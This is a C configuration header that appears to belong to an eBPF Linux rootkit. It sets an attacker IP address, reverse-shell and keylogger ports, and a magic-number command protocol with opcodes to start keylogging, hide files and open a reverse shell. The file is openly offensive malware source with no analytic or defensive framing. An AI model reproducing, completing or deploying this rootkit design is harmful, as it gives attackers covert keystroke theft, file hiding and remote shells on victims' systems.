#ifndef __CONFIG_H
#define __CONFIG_H

#define MAX_HIDDEN_FILE_NAME_LEN 32
#define ROOTKIT_FILE_NAME        "rootkit"

#ifdef __BPF__
/* vmlinux.h already provides these */
#else
#include <stdint.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

#define ATTACKER_IP        "192.168.122.1" /* Attacker IP */
#define REVERSE_SHELL_PORT 1337
#define KEYLOGGER_PORT     1338

#endif

#define COMMAND_MAGIC 0xABCDABCD

enum command_opcode {
    COMMAND_KEYLOGGER_START = 0,
    COMMAND_KEYLOGGER_STOP,

    COMMAND_HIDE_FILE,
    COMMAND_UNHIDE_FILE,

    COMMAND_REVERSE_SHELL_START,
    COMMAND_REVERSE_SHELL_STOP,
};

typedef struct command_packet {
    u32 magic;
    u32 opcode;
    u32 arg;
    char data[MAX_HIDDEN_FILE_NAME_LEN];
} command_packet_t;

/**
 * @brief Event structure sent to userspace
 *
 */
typedef struct {
    u32 src_ip;
    u16 src_port;
    u32 command_opcode;
} event_t;

/**
 * @brief Keylogger event structure passed to userspace
 *
 */
typedef struct {
    u32 code;
    u32 value;
} key_event_t;

#endif /* __CONFIG_H */
